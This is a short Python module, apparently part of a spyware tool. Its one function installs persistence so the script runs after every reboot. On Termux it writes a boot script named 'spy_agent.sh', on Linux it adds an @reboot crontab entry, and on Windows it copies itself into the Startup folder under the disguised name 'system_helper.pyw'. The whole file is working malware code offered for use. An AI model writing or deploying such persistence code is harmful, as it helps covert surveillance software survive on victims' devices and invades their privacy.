import os
import sys
import platform
import subprocess
import shutil

def install_persistence(script_path=None):
    if script_path is None:
        script_path = os.path.abspath(sys.argv[0])
    system = platform.system()

    if system == "Linux":
        if os.path.exists('/data/data/com.termux/files/usr/bin/termux-boot'):
            boot_dir = os.path.expanduser("~/.termux/boot")
            os.makedirs(boot_dir, exist_ok=True)
            startup_script = os.path.join(boot_dir, "spy_agent.sh")
            with open(startup_script, 'w') as f:
                f.write(f"#!/data/data/com.termux/files/usr/bin/bash\ncd {os.getcwd()}\npython {script_path}\n")
            os.chmod(startup_script, 0o755)
            print("Persistence added via Termux boot.")
        else:
            cmd = f"@reboot cd {os.getcwd()} && python {script_path}"
            try:
                crontab = subprocess.check_output(['crontab', '-l'], text=True, stderr=subprocess.DEVNULL)
            except:
                crontab = ""
            if cmd not in crontab:
                new_cron = crontab + "\n" + cmd + "\n"
                subprocess.run(['crontab', '-'], input=new_cron, text=True)
                print("Persistence added via crontab.")
    elif system == "Windows":
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        target = os.path.join(startup, 'system_helper.pyw')
        shutil.copyfile(script_path, target)
        print("Persistence added to Windows Startup.")